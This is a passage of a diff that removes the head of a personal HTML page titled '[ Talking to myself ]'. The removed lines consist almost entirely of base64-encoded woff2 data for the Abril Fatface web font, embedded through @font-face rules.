@@ -1,18 +1,1436 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0"><meta name="description" content=" [ Talking to myself ] "><meta name="theme-color" content="#ffa259"><title> [ Talking to myself ] </title><style>@font-face {
-  font-family: 'Abril Fatface';
-  font-style: normal;
-  font-weight: 400;
-  src: local('Abril Fatface'), local('AbrilFatface-Regular'), url(data:font/woff2;base64,d09GMgABAAAAAB6MAA4AAAAAWmgAAB43AAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGi4bl2wcfgZgAHwRCAr+OON7C4JaAAE2AiQDhTAEIAWEWgeLXRvXShVsnMqGjcMAxL/ZoigfnMnF/5+TGzIE+xGnVSsoEkTprOLCatNCL3NWSrwGiVOeC1Ma4cRt9lKgeMLz6SDPn09f5BtlurhiH5hIRzKSsRXMg/2K5qMneJOanClsEllsWP7NwOgqOFj6FH46vhRKUfOL5PSG6O7ZpIb/7ghNTtFKFL8f6Oz9HyB2gEJFGABURA7JRcURynBBVVVVEfjaVjZveNrmvyMVlLgDjAIbq0BRoixmAoc9xagA10Z/t/6hiw51a9Sf5Tr9f+7nX9R9G6UXWCTYMCLEPk9sZ7QJDSSDqqja7xmbofKolVLIeIlEfCKG+J+43uQWboIdYg0osAFwdFtjr5hfMLliVkqHntfzZUk/yOLTCchsysWeVcP5D/2eUnVVDAqlatMITV/otwweT6qRETrBhufZe/w9A0KwLhbLhqekMPw/qOf776uRyqkxyGJz6D2a+mJFZw6JbSj+RXvpp4AlwaA2M4Pyk5OLXTPPnBc+LoXWqgUpPkHy2Uo2sV3v1vv2IDOPXThRzoyIaxUsYlKl49qjjaog0/8yPr1qrfWzbPZC8iVCyr2WaMjLNRWUVF59Wf++grX5gndvjZfkM8m+6LsDLPlb69UlrcgmptDFWDK0IcWKXDEUTU9N2VOim4hET3fOx9aKBJfKXmXqsOuRk57yyGuqMIgiisiWHucv13Ec8//t/Ytzh5bQpP7kAhhufJwLHgQLgpCDKChgKK0HmbATBAIM5SoIZvZ9FyiH99ZXAgocwE+TWQ4drK0EZgB2P+BgAB0L6TUE4sy5/eHKI001IWEpCcknkL/8EAvOEiWpVa9Bo6XWmrDZVhAhKgxhq6tpKyAwHKDn6CXnvAXBSRQ2CMVocSzAGrawhyPYcIYr3OEJL/jADwEIQgjCEActdEA5cOEjRIwUEAUqNOgwYFr6wpGF2tCBLhixpHCZUCsM1vNHHwYwgjGMYw2bFNkWwza2o5FLbvbRaeBs5qrfrid2E7jPHlP2FHjOXkIKAgAAAAAAAAAAAAAAAAAAAAAAAEASSSSRRBJJ9GEWAAAAAAD0oQ99hbNRu9RbGFbYANgvfaSdobjhjife8Ynv8Z7pzs6tzE//CmwAx3qR6+JDdIx70gF2Wx0w9aERucpEqSHczG3IYNUYUXV3gqXVnpWl1FukCSlYkSQO1ateJXEiq2WNaWyW8TSOBdxzOqygMQnapuIQicSQyAQIkyrx+JN5fKRs1qbjA0jTqNheYQ0s2j9VJf6zKo8baai3PDlPejAKERVuDwuDBMTBHF0MxQIq06VOEqWxoo54q97O2ndFO6abDMiN2As0/CytLuRihyqSNGLSxvvolu27IZa08Y5qm6hsSOvQjyXdPdfSUrZaZPKC/pWotKq9fNXnHik3bTaRZr2yybCVHBSuBFhkJfgQs3HqEWGFl7uCDOkTWTZlZviMNdg49F5HsjtyAOmiSdKWyOWRv1KzJAxjMxflsmOwxEJ5fHwlhXL+6XfY3HHmVQFHRlmB6hypqpyXZuNJ0McToMTKzZSEpfQ6ZU07zorLXi034lrEzzLq1oy6f72YcG5+o29Zq5Bk78GvLaFKqWZdtuysCCS6Ldc97Sf5Ka7npEoXmibZXtxbBeegNE9/+knYSn52a5cqiSvuK8LsFHMIDmAeF1Ru9GgKFEhUpEiSEgOSDRvV5CvrtZqwgxGEYTU6MKkLgYdhgO3u2NTFQUbgWW8QYxgRc8cTsLCYsVrQnLW87ySxgQWBqXXJ7Ba0YD9qSw4rp2CjclyQxkkes2NgAS1F0oepSBLSRJHKQBBrsskodSHmI4CRGzykLoRWNLpMBlIjBFbJiZjvS5SaCQQsVqyUwxLR64IY5FFjWawcxxIeaUEzcBLg3EDcK5I+VkZJQpooUvJf/HUjaWXRO6NWrlax0datXsRm/R+AATUzA3X4mL4cUIZ2BkCQh10QEDCYPXUUOKutsdY6EJxKVWrVwWQ6Hnigvq4i4G4zSf4Q5P0/LFonuTT2AdDTcboNG9iziQPiSnrnLz/wQOIyG7gHkN9rETCbgAYaNt40CCI4xY/PRDRYhAQkOV0Zyf968WZem3mGsLUT0PKoy8irrIdenHnap5uR4dwfgY7z+eXPyezD3wQZ1xFQ0yjqm/IFyxYgwwEY9x0w+R2Q20COMzXMBBgTGmQki4VtCiH1akB6Zz+bCOqBBYVM1WwwdxwuxmwIRK0ZfaN2SlYrJlSoVBGJilhm3Tut4Th4atM2pp4Y2WD9A9n0DO5D/eATknLhUQsNzkU+UHJ8iPGh1McYaq5RU40ooZxMsoXUZm3VNPTmNTRwQrSlSeuExEqUac12EjvKooiyomD55DKXi8KsimQpt9jiJqEUL8biQTku5OqRlspKt9w0Zcptv7NczErJSpI0JI1YoRo42INZsHAwDn3SmE3pUhOqqC7VXLXU/1XADBnxpJM6BEiVPqrwINUHiV/TTSktWUqZ7HNwRzTdrKdAhXsmIV4wnmzxjEf8PGmrimdtm6ATiF528nTE+S4KIPpmX6Kd8Uyi1vFP3evw7+HeA4tdZoX+mn19hiW9p3oSCOo3r3f7vPsSUKRjAB9vNOSnQxzte2aSIUHnbvc225VjqIxl3+Cl/FGPHXIuO58IsOceVk6H+Cqy6X+1Oc5SY8ceBXL9fOE87z41mBvuLVhOX2v8vqnHmX1PZI4Qq8e8F0L6Bq7yiWkYk4YEBGLlkH+2r/Vtie6NBPL7jgDt6azA1viYmnuBh+yaGH6EPmc8cuDCnJjxp8r1tU0+76DogBhugyS4R8S54b5rC2gjKAxbl5IMwxZcsmiIH9q2ls7n7/B6GuCV15SKh4+kfYS9YFzy38kXZgSFrexdtlhv9KUnTh8j1RNprT5T30XarpY3b/Q2d9K/4j4r3rV6dJ1pFw1iCK2k5VGc7yWLaAUoh0icLnfiC7/llN725gy7eR/wA+OIOzhz+PJn/Yl3PQHCxqxuucQcO9fx4fcozDkLam/Uk5tcMvDgwa53De4/njyUIxODQRcdeeEK4xiD/cK75DjQVFjbK+n1g3/8sf29u+c99XnRQZba9O112h4iQL0QFNefiZcQWtuxnopsRofb7F2S+rY5qABRqgR1qHvcL5EYdmdfASb1v+beYFwKJJAZhtojLMadJkIMIywSgPS2FCPoK+eymsJ4RiWx3d2wRBES6qR7ZCOa3SNpg8JpqfWyIEZYerzc9rZCKs62DXBR20RnTXC/SygrI+baSlfX+j/xs+MpvIom1MTE5tQ2zJXf82ltuxNVMOYBy0aPeUk7ADT+y9sBkf8MA9YvCFqfrxBeuW+MrUUsnNnvQLv/F5Cefmuxck2ct4Ohb1HVyJfkSkVlnaLIqZAobW6ycxK7X5m5ZpCEOQwlwACIfsVCBHCxttL55xCyCqwkW/KfD6qnpoHogGx48JLrO1YzW3vY9593rasIjworDYYJ3nh4rE3F8svVELL3gyCqS5lLMpiCb1mUlkxR19aC7nQOd/WOLxwV9ztXiPfAi1ZTpJO+k78Zvzb7O3zDDa0fAZ0T0WwaavZLkXo2DDmkcv8ANW9YfGhbkjaOyz7LnEaxZLWY4WLbNd85S/NDEDNSJpYWTBkc2mJUUSYfjyjBKmCfKSpmm2wrbOZ23fRmTStxS/xT0VSkxz9Vvxtqo8YsZ8KqbFEsKYecJhdcVf+dbsKRSi1K7nW0gvJIrBzGnMcrpKuBhg0laVxOjvnJXEoESqKavT3mp5sHRcy6Wm7wSPB0k8HkosY9G6y/uEPZUHB7sld1Y49qq0sMt+p3IGxLz6Fdu+y/AThrs5/3bfP73JL5/tluUytkCfgsnl8GoCsb5W2tLV37mfZUF5HuygjiPnFPG0xqMNsHDDf27nVxM93umWt3W9IxI4G2u6Sgx1G4rUNzBr4uxeyOKqu0e+KZ541zc3Ned6FO76TZbW64x2SYnT08dfy0zW5wsRVOWZO05CKRXTxHhWnbU/65EQNAhOZ+3zTuJPc6eBrW9u41sjaRehgs2ZG5njEGtZPh/5yzlmrE5MDJ3Jltlak3BT6SnfOq0tAmkNdjUpNQ9DgOQgGMxCGqSyRwYNEnm565OVlmI6MhVWna2FWZ0d3FSSoxvbb0RshYOgElIesiojQEf816ZjMJUjDe1Df3Byxdf+uzudilmIWPw9JAuVg/ejkGcu9Z45meU7N3jfd67xhus9t7sc3ZT2UayDsvkboY7tRhnidePKY+Q0s6BjOF7KJwSi+6GrqlHFHOhZbJbT6WnNAEivsco8x+aBvTAnQMIyygDGUAsYcqwYP9iaZblrbuVeJqFnGcoqxnH+gDPzp3UL8ZPe8znWOrydYknamVD10sMGwm9150ySCxEYhwLr3euKXNvF2AjclCpdPX3aY1OnLnk1Bbg8PzHK7DjYqi0zmHIpcklqTLzhrKyDoyFlUzcpwNRd3Us6OtR6BUu6NzesgYlLm/d15r4OTsIfX47GKbQAhWg+4JWIuesE3aUTdLXjbbZAx6RtCQDrZHtnGE4zMjdkglOxy7Xoqj3bEj4xiL1uSYZe5kDc2VcbG999tPCZSZFlX7FfiWs3lekXoNQ3sCMu70YKR1zLl0+6uZlvbmBCrxKSgC1mvGdq3ZwNgANpC0xu/W7Rnfw4LmnSZNPXuMe3tn3daR5Znst873Hkf/t9N946u7wjNbllVOBVr8C557h0U5DLEjfIGTZFMvsHXXprbdaUpPKp8JcXDGF/6OtcMl0mZ67OXgoLGW6OoQ1Z7dTt/5ZhGFGTTAuefjllMVovfWNCoSR+iwxi0so76t/VmfsTMtS158K/EdF5Zw9LQAMGhuWPpoqKP6L7MeW4+8QL2w3qUNhqPzEvUip6LAZK/wPYvAOuq+bEdvqW1ufNDXFWi2x+qT9uLCvyZ0KwuH35RFqJgn2m21hoTUcK2PKjdZEZrIeF3HboovyyiXfJ/O4u+PuyIPCCaZvg2TVfknxAYmBPjXAtUlTS5D587altmXmVAxU7GV7XFq8ER2V9eTlYa3LY2tX47eWTdejtQiGubDvGM8+NniC7Fh2ZO5BzN2vnTtBkMOWthoUYW0UGLfXzAjo/+i35CTmRQY5sH4ZYS81iLIWOZ/24Z6u8n60IokGe3YtwXb9VpUuOEokSUHqX+T5ry5L1y/1ZcPP0cj8cEdvCA/+P9pHsiZgjEwNy1Jl6SAV8BeTVOrtEFZQctHp3xhfzgyIzV6wboE4KZgZzisPL4uXgb3w0EnbNlZyXGNslD1SddUBVXt0niayRUl2adk6XZMAU2csESxVFkc97f35xcT1Hjk0HLAd4jwzMK/FkOnllUC1v36vuxRRVFoxZ7HJXPGye+NSuQktqyt946GOS9DXc9nM3+38v4XGBVkBT+1e+GY+Suq+XhkLeL/eU/Khz1+SDSy+EUW/vAqsJeWy/VhDo49n++tKzn+J31ne/ydU/wPpOruYrcffKavzrVbqVpST0o81p4gOCb42qzaKeemwYpPY8sTpX8xneemxpL/Khs8sN47cSD5m6TKjFmY8Ct5yRqkw1EycWBv7omzm6LqHRlr0snE72Gf/OzSHcG1374wltA9928SC3+S3Q8uGT1r518U27aqXzYsO17VVkVdTsLmC1Hk5hPzg9KfganCzbqk0riTdoh0XIqEnju7YS/ZvUA7sC3iD43vsnjrG38JvVSmDFMumAj+0dtOaoVWhnSs5CQWa7Pb2t5d0e3ziILf/xwI//oT8flGvvMVzXX+W4dkABfaqjwlmIcVHkZ9IVXVJXoabY1gF0mB+YGMTTInO6Pg90N8Jp8XCBcqf1wB46SZ+WWYm58Rl+YS6uwvUs5Q+9DpcbdCrSXumYYKKw2D+IMbSzAkWJXhcg6BfFY8sUFn4K2/xdVJ+UBfxZ92rJ7H4mgRz4mli+HGetfCpkk+8YOHO6eNdEhXn93/1ulDWWYeOOF9QcxiszxsqdYcSo9LoOss0PrGBCzOq4xa6504Hrcm82eUT+dKJOPIWXuur1v2llxBe5OA2VJvy+ze03mq0rMKPrjPiE6StGL/NaWj8P+jHL33PHGxsXoMDeXoFdVeGnCEXSF+8Qck3Q7jJB+JCLsaJkDCEcH4e57yqjIC4f/lcy3KYDOZP3pW+UnCk/U7Xwg7mKuIfM5kB6RGMrxhe5g3zasCEQXDRq+OnnpUYatYUMIW/o4JEz+FXl11lf4MDu1k7pxScXs8IVPYyQPWJwMR3jgPeX9YAd0z0hIPxN3sICv6/Jeg4kH3+eEicBxxG1E4p2bjApU+dts3gvvrq2k+zIV5xwRUTVSdj18gnjm0HPN4Rh/zh27R5vvz/BxsV13aiB8Tdi8aYtRdqeMB/icBdz2Puo2iTae1IKsWB7w4OvHhP4EVCG/fipbW1uTsKL7309RVgt0eA3bfsTwrS97GgyK26JgZuZaPKJC+fLJ6pyFVJdEJE0pDUPf3BVFMeTlGAhfKFR3ozSfRXSpq+kC9n+LegZXu9G8Ovv6Rm7a0F7UXZ/9BRtbYhCcie5HInWefzIYhEsR/UmiMylU12GXGRn96k2G/6v9c//KDnWDetAB+9c+r309kw5dhZWP+rhRXOJUjhGMbcO+2AeNkMat0yFWTXxRcxoQX4C7NqxQPvF34R69+rq5DTQtuJZYWrkJ9cS0LFowqxCVfWEojeUeu9XQWFK/T3eTSCK2G0jqzgNsiNiYR4LlR12svb8vWw/NJd47EepQIrpNyJZyUaLcN1/uTLGWnxrjkCcCibdv7tMvrecgqV0sz8K/++sPbElUmJ9D8p2eZ3rrbMd4rXVDIRerHeFHf5WH7WD44c9G7DIcb5V0+PkcQzem9doEi0aYtHSVtpSBS6Laizfc84dhYXb8V6CiNyuFm5otuWJHTejAtiu8FJa7jDzos5PFExUGqOg2LM6QueM6iKXJx2mVzeP8P04mhKBtU+DiCl4a4o05hqujIvUfJ0Wk1Ma1w4ezvkkS/pe5rJw+h+y7JJ0/otpyGL1p0Yk5ADo24fNOdHRx/7AL/LS97gu6+dGAFg+PWlz5OjD945NAWhsul5fkgOjc0UYIoEMm4BPHrLrdNeb0jNUZDwCaRRLFoaMiEq3gpRFKXTMpVpbH8ixnKEHZ4mCLRIVEaEetY3YXmC+5ZFH/U5UP849Zd6t22W9zfgZwUpAqtSAlf4yV3WrhXkdbZVRla62g/QSZM0fy1xcVtMn5OUlCDU3y+e97kXmn58u7K8BEHM8oNivSI7q1dafT9qVq6mfKQrfhJy2fE8pzUoiSNKxEq/ZYGNSHOh0cpr90wsY4udpQXnpEX6qwZp6ukdsNk9vDJ4n2S+luGNKuXRrvdWyFVLLHd249s20nz94j3UtliscWIhrntdWF/yd3FO5maEUuxIp9rQMzfg+qAgAfzjMd993bD3cn+3pEzeogoj05SEzdQ9aMEH6eVFK+U3qOC3OfC7WzOiUDaqbagkt+nhohi4ix/yHZITM7E3xX8jJ/C58jkje9PPd7N7N6C/AuIDoGRzcLcSbSg+JIEGUF4p9srWqxG6voP8BABIjF90I63+IFNrj5dEz+jD/1caMUP+ToQVMbGuPCF/FhrpBPRKvKcUQXsQBhoHZet6DlpAorPx3EbRmWXoC4Sc1dZ+y1DrA5ciUHbHDXNwPwsbZ1KcRKcCUfCEMHY903fFyDXEOnRA2mjF40X0Q8H/BEFouwOrm+lr7afX0C7TJOOL4qPQp7vEPzti/1pYppEGcHun1nyH81363eS5THgnL6y1qEEJr8Aaa8RblrGovBmmPLzWq/u5tH9OIUfHrVU56C2eRTq9Unq0xPkggSJY5mlxdkVyh6dG7X1TEjwwX0zvwoyeS8uw02Bm9RHCw3fzzv/hXuzqLQVLoN5xyLgCNxQxZhREyvV/aRaHoy6IzKw7rCz2RmHrQOcgZAAq1UD6+vilALNq6TUkB/c77G/hlleZ9KNCE6E9WD/Nw276wajltC5ijxnL8Wyt5PzTBXRM0qv4f1EHfViFv5wbGe1thHy3bXbZkD9rR47vbd32njpps0s4aR9e/N0qlSfyFoR7y/q7nlRPLIO8R8YcTobcUVQF/T+eT1T9u67tFnws61ylY38nIyya8vp7aIs+0Wr7ONPymb+jttufpNzacxv6efvvnp7w2mXVLjkWApRUaMqI5qO8qBteaeRjfs+q6i1eMLtwhcMLbaLRW2jR/1lgxqlvDGcLA3wtErpLgvG1fq+ZnvZZOZhLO2rm7t4H9hnYO+2mVWfAStC7pa7Cu3grxDuq8/KtBNv/FQFNCB7n+U3Ld6lbAo6AXxL9zD/A8W2c97B5iNuI0pOVNwJHvKaeDtvwoec/3nei7ajq6EVe1sTfqv9tmWTeL8nvcQoVHlhxFf20jegvE3jbP+89j9TDL2aducRDAY+NvWIX4sH7r4tdiH0YweuMwhDUKCthtIQ/tXgWV5x+D7HSDQsPyYkVKShDxfzgykiTEBZyFAWoLkDPDAQAIhURJBAiHKnBcMSLFgMar+0FIhRoIsVVcx+SRHMovSpX0GCeRSsxep3ZQIpyj21FBPIlQ4Lxk+gKX8DwcLz+kEUvMQSP/2uBpZ5RBD21k+kdYpOcKEGz0foLivkY+As4B6a7hkWobquCD2+uDmjzEHp/MuvXgao1G8Qay5DAK8HgBslg0LrF9S2cz9fJk4kBxgo0oxwq3HNRO4wlUCYwg8Cj7hfofAlHrSlIqPS1UP3RIwy1Zi0VhJQ++sheJeyxIxDxITbcbEbQtVn5D75J17WzzhNs6mO4fmQDdzilVrT4fGwKTKP2bG+K8GtPUMEusX1J0yb7DG5K5DfSsIgIY37Sk5ZAdhWSWa5PWyMCyKP7CEIENKDs6t596jI/wAZ+z/A9+fcabhdzi+/9NbeGTAYBuAZ4Koto88ofVq4Csi46BvXPG9ZCXgL5F8rSo+Rv1ALB6hF+rLLCZwnSDmAU1lwnRSxGDB5KS+gtnCi4wNGHUF4oUSTPIArygWZF5i1Rs58gFQMktWYBsqC5D1ck1yw8keYVdwKAfINwEbPJlHtvxkIhKEgIafLZlNVpPADWoKapX6lgXIyOS01ZiJr2CgcziVE2iq1qVm9GAmS61sdQd74h7jh2pfx11EDt4ekTnAXLFC5C510J9cY2hsO3QMPKrNzjpSu7g1ClyV3SQZM2aH5AvKSaypdiNbWTN1O9+aAkAbiqNMZ1WDc2E7hNUvbaJygHCP4CmmJAgO0sTWURXiCsrt/FJEGDuYqY8KKBwMBBiuEBfXmAKQHAFkeYhvc8hiUOC6PlRKfShyR4RHuXJ7AM2seL4qQnCNTpVqLWiWKFKvH5kmPiy1IgMDJfOAIOaLWsnQBtSoUsOJTq+VoTYcOP/XEar7q9zP70atSgSuYbFIyP44txbW6gTXGmfOxKVWptJJJkKuiQl3WmUSeUVZOGLuuUil/IAIsd7DCAT0vgahnijQop3NW65BFHJxCbux9ZURsmlYkWafEE2PzpJ8AAhW1GzbAl/Qjt161CP4zWUfPjdGl69Xxk2R+lH6q1CriL5GSCgaAlhBkTLy5haR/I8jIKcWIk0JDSyddpgE/6vdNuBAWwh2qUmvyf36AVqdPIzEYMZnpDCaLzeHy+II88hSKxBIpCMGITK5QqtSavLQ6vcGIYjhBUiazxZp5Fm52h9Pl9kCgMDgCiUJjsDg8gUgiU6ip55NlVjQ6wGCyZNXmcHl8gVAklkhloFyhDFRqjTZfOF3G9QajyWyx2uwOZ269efDoyZ2XXO4enl7ePr7+DfK8CkYtFDcdQPZn89+MeBdT1O/2hwKrXHp77FFrKs8O2ONTJN9h5fxSeaCCZrpLAz/Swlp2VM9in13SR8TnDcMQIUCPI5argbFmfDUhGIMsq8Ejr6fWJi5EVE3RFqiHdBk/JS68nhYTlbmK3tOjynVmMP95qw3VvpUYP+EqxOjVBoaZUHWJgllFdXtWSVT3Cpy1ns0pcutC8ddOKFXAb7+ur6E96hV4stFWEn+IF9pcxZfzU+3aAlEk1NcSa/UhUejH+367ZaNYnv6amiTeUcLQStIWhIeQJAypKF2/+DrS8+9b+r84YC1QjYTmWmqtOaQKcws0rrB4vbaZomVftL3zwCbetAtNX0Jfw1D1yzO4hkBoC4PwFgLC1qTBzV416W3aOwJ3tbZWApe7sX3HiM3KAxHboqsFjk/h7nHO13DNXdW3JDX+dYgh+cJmfKKdkKXpH5+Te+m3pXdChEGOvZYmXkh0HZy9deKn7PtuJeuwC8ynEtPecOx0c73CcWprlrk9zYQ2e3xsgX1x7ao=) format('woff2');
-  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
-}
-@font-face {
-  font-family: 'Abril Fatface';
-  font-style: normal;
-  font-weight: 400;
-  src: local('Abril Fatface'), local('AbrilFatface-Regular'), url(data:font/woff2;base64,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